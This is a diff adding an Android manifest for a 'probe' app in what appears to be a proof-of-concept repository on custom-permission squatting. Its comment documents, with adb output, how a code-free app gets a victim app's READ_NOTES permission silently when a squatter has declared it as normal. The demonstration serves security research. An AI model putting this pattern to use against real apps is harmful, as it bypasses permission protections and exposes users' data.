@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  examples/squat-pair/probe-AndroidManifest.xml
+  ============================================
+  THE THIRD PARTY - the app that proves the point.
+
+  This app has no relationship with the squatter or with either victim. It is
+  signed with a third key. It contains no code. Its entire content is one
+  <uses-permission> line naming a permission that, by its name, belongs to a
+  company this app has never heard of.
+
+  On a device where the squatter owns that name at protectionLevel="normal",
+  this app receives the permission at install, silently, with no prompt and no
+  user involvement of any kind.
+
+  MEASURED on Android 13 / API 33:
+
+    $ adb install -r probe.apk
+    Success
+    $ adb shell dumpsys package com.third.probe
+        signatures=PackageSignatures{c528c09 version:4, signatures:[dc86461d], past signatures:[]}
+        requested permissions:
+          com.victim.notes.permission.READ_NOTES
+        install permissions:
+          com.victim.notes.permission.READ_NOTES: granted=true
+
+  And what the shell CANNOT do to the same permission, also measured:
+
+    $ adb shell pm grant com.third.probe com.victim.notes.permission.READ_NOTES
+    java.lang.SecurityException: Permission com.victim.notes.permission.READ_NOTES
+    requested by com.third.probe is not a changeable permission type
+
+  `pm grant` operates on runtime permissions and on permissions carrying the
+  `development` flag. A `normal` permission was decided at install and lives in
+  packages.xml; there is no per-app runtime state to write into. See
+  README.md section 3.10.
+
+  AUTHORISED TESTING ONLY.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.third.probe">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
+
+    <!-- One line. That is the entire exploit. -->
+    <uses-permission android:name="com.victim.notes.permission.READ_NOTES" />
+
+    <queries>
+        <package android:name="com.victim.suite" />
+        <package android:name="com.victim.notes" />
+        <package android:name="com.squat.first" />
+    </queries>
+
+    <application
+        android:hasCode="false"
+        android:label="@string/app_name" />
+
+</manifest>
